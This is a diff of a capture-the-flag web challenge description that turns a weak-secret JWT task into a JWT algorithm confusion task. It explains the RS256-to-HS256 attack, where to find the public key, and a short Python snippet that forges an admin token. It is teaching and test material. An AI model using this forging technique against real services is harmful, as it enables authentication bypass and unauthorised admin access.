@@ -1,19 +1,85 @@
-# Challenge 12: Broken Auth
+# Challenge 12: JWT Nightmare (Upgraded from Broken Auth)
 # Category: Web
-# Points: 350
-# Difficulty: Medium
+# Points: 400
+# Difficulty: MEDIUM-HARD
 
 ## Description
-I implemented JWT authentication, but something seems off. Can you forge a token and get the flag?
+I implemented JWT authentication with RS256 algorithm. But I heard that algorithm confusion attacks can bypass this...
 
-[Host the Flask app]
+**Service:** `http://HOST:5004`
 
-## Flag
-flag{jwt_tokens_can_be_decoded_and_modified}
+## The Vulnerability: Algorithm Confusion
+
+When the server expects RS256 (RSA + SHA-256) but you send HS256 (HMAC + SHA-256):
+
+1. Server has public key for RS256 verification
+2. You forge token with HS256 using the public key as HMAC secret
+3. Server verifies with public key → SUCCESS!
+
+## How It Works
+
+### Normal RS256 Flow
+```
+Header: {"alg": "RS256"}
+Payload: {"role": "user"}
+Signature: RSA-SHA256(header.payload, PRIVATE_KEY)
+```
+
+### Attack HS256 Flow
+```
+Header: {"alg": "HS256"}  ← Changed algorithm!
+Payload: {"role": "admin"}
+Signature: HMAC-SHA256(header.payload, PUBLIC_KEY)  ← Using public key!
+```
+
+### Why It Works
+- Server loads public key for RS256 verification
+- When you send HS256, server uses same key for HMAC verification
+- HMAC with public key = valid signature!
+
+## Files
+- `app.py` - Vulnerable Flask application
+- `challenge.txt` - This file
+
+## How to Run
+```bash
+python3 app.py
+```
+
+## Tools Needed
+- `jwt_tool` - https://github.com/ticarpi/jwt_tool
+- `python-jose` or `PyJWT`
+- Browser Developer Tools
 
 ## Solution
-1. Login as any user to get a JWT token
-2. Decode the token at https://jwt.io
-3. Change the payload: `{"username": "admin", "role": "admin"}`
-4. Use the weak secret "weak_secret_key_123" (try common secrets or brute force)
-5. Encode the modified token and submit it
+
+### Step 1: Get a Valid Token
+Login as a regular user to get a JWT token.
+
+### Step 2: Get the Public Key
+The public key is usually at `/.well-known/jwks.json` or `/public.pem`
+
+### Step 3: Forge Token
+```python
+import jwt
+
+# Original token (RS256)
+original = "eyJhbGciOiJSUzI1NiIs..."
+
+# Get public key
+with open('public.pem', 'rb') as f:
+    public_key = f.read()
+
+# Forge with HS256 using public key as secret
+payload = {"username": "admin", "role": "admin"}
+forged = jwt.encode(payload, public_key, algorithm='HS256')
+```
+
+### Step 4: Submit Forged Token
+Send the forged token to get the flag.
+
+## Hints
+1. Check the JWT header - what algorithm is being used?
+2. Can you change the algorithm from RS256 to HS256?
+3. The public key might be accessible somewhere...
+4. HMAC-SHA256(key, message) - what if key = public_key?
